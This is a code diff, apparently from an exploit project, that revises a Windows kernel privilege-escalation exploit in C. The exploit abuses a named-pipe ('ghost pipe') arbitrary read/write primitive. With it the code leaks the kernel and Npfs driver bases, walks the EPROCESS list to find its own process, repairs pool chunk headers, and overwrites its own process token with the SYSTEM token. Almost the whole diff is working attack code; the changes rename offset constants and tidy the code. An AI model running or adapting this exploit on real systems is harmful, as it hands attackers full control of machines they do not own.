@@ -13,28 +13,27 @@
 
 uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
 {
-    uintptr_t pipe_queue_entry_addr;
-    ArbitraryRead(ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
-    printf("[+] pipe_queue_entry_addr: 0x%llX\n", pipe_queue_entry_addr);
+    uintptr_t ghost_np_data_queue_entry;
+    ArbitraryRead(ghost_pipe, addrs->np_ccb_data_queue, (char*)&ghost_np_data_queue_entry, 0x8);
+    printf("[+] ghost_np_data_queue_entry: 0x%llX\n", ghost_np_data_queue_entry);
 
-    addrs->ghost_vs_chunk = pipe_queue_entry_addr - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
-    printf("[+] ghost_chunk: 0x%llX\n", addrs->ghost_vs_chunk);
+    addrs->ghost_vs_chunk = ghost_np_data_queue_entry - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
+    printf("[+] ghost_vs_chunk: 0x%llX\n", addrs->ghost_vs_chunk);
 
-    uintptr_t file_object_ptr = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
     uintptr_t file_object;
-    ArbitraryRead(ghost_pipe, file_object_ptr, (char*)&file_object, 0x8);
+    ArbitraryRead(ghost_pipe, addrs->np_ccb_data_queue - NP_CCB_DataQueue_OFFSET + NP_CCB_FileObject_OFFSET, (char*)&file_object, 0x8);
     printf("[+] FILE_OBJECT: 0x%llX\n", file_object);
 
     uintptr_t device_object;
-    ArbitraryRead(ghost_pipe, file_object + 8, (char*)&device_object, 0x8);
+    ArbitraryRead(ghost_pipe, file_object + FILE_OBJECT_DeviceObject_OFFSET, (char*)&device_object, 0x8);
     printf("[+] DEVICE_OBJECT: 0x%llX\n", device_object);
 
     uintptr_t driver_object;
-    ArbitraryRead(ghost_pipe, device_object + 8, (char*)&driver_object, 0x8);
+    ArbitraryRead(ghost_pipe, device_object + DEVICE_OBJECT_DriverObject_OFFSET, (char*)&driver_object, 0x8);
     printf("[+] DRIVER_OBJECT: 0x%llX\n", driver_object);
 
     uintptr_t npfs_base;
-    ArbitraryRead(ghost_pipe, driver_object + 0x18, (char*)&npfs_base, 0x8);
+    ArbitraryRead(ghost_pipe, driver_object + DRIVER_OBJECT_DriverStart_OFFSET, (char*)&npfs_base, 0x8);
     printf("[+] DriverStart (Npfs): 0x%llX\n", npfs_base);
 
     uintptr_t ExAllocatePoolWithTag_ptr = npfs_base + Npfs_imp_ExAllocatePoolWithTag_OFFSET;
@@ -54,13 +53,13 @@ uintptr_t findSelfEprocess(pipe_pair_t* ghost_pipe, uintptr_t system_eprocess)
     uintptr_t current_eprocess = system_eprocess;
     do
     {
-        ArbitraryRead(ghost_pipe, current_eprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET, (char*)&current_eprocess, 0x8);
-        current_eprocess -= EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET;
+        ArbitraryRead(ghost_pipe, current_eprocess + EPROCESS_ActiveProcessLinks_OFFSET, (char*)&current_eprocess, 0x8);
+        current_eprocess -= EPROCESS_ActiveProcessLinks_OFFSET;
 
         uintptr_t current_pid = 0;
         ArbitraryRead(
             ghost_pipe,
-            current_eprocess + EPROCESS_UNIQUE_PROCESS_ID_OFFSET,
+            current_eprocess + EPROCESS_UniqueProcessId_OFFSET,
             (char*)&current_pid, 0x8);
 
         if (current_pid == self_pid)
@@ -92,8 +91,8 @@ int leakKernelInfo(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     addrs->self_eprocess = findSelfEprocess(ghost_pipe, addrs->system_eprocess);
     printf("[+] Self EPROCESS: 0x%llX\n", addrs->self_eprocess);
 
-    ArbitraryRead(ghost_pipe, (uintptr_t)(addrs->self_eprocess + EPROCESS_KTHREAD_OFFSET), (char*)&addrs->self_kthread, 8);
-    addrs->self_kthread -= KTHREAD_THREAD_LIST_ENTRY;
+    ArbitraryRead(ghost_pipe, (uintptr_t)(addrs->self_eprocess + EPROCESS_ThreadListHead_OFFSET), (char*)&addrs->self_kthread, 8);
+    addrs->self_kthread -= KTHREAD_ThreadListEntry_OFFSET;
     printf("[+] Self KTHREAD: 0x%llX\n", addrs->self_kthread);
 
     return 1;
@@ -131,10 +130,10 @@ int SetupPrimitives(exploit_addresses_t* addrs)
         return 0;
     }
 
-    puts("\n## 1.5 Fixing VS chunks\n");
-    if (!FixVsChunks(addrs))
+    puts("\n## 1.5 Fixing VS chunk headers\n");
+    if (!FixVsChunkHeaders(addrs))
     {
-        fprintf(stderr, "[-] VS chunks fix failed\n");
+        fprintf(stderr, "[-] VS chunk headers fix failed\n");
         return 0;
     }
 
@@ -150,12 +149,12 @@ int SetupPrimitives(exploit_addresses_t* addrs)
 
 int EscalatePrivileges(exploit_addresses_t* addrs)
 {
-    uintptr_t system_token = Read64(addrs->system_eprocess + EPROCESS_TOKEN_OFFSET);
+    uintptr_t system_token = Read64(addrs->system_eprocess + EPROCESS_Token_OFFSET);
     system_token &= (~0xF); // Clear reference count bits
     printf("[+] System TOKEN: 0x%llX\n", system_token);
 
     puts("[*] Overwriting current process token with System token");
-    Write64(addrs->self_eprocess + EPROCESS_TOKEN_OFFSET, system_token);
+    Write64(addrs->self_eprocess + EPROCESS_Token_OFFSET, system_token);
 
     return 1;
 }
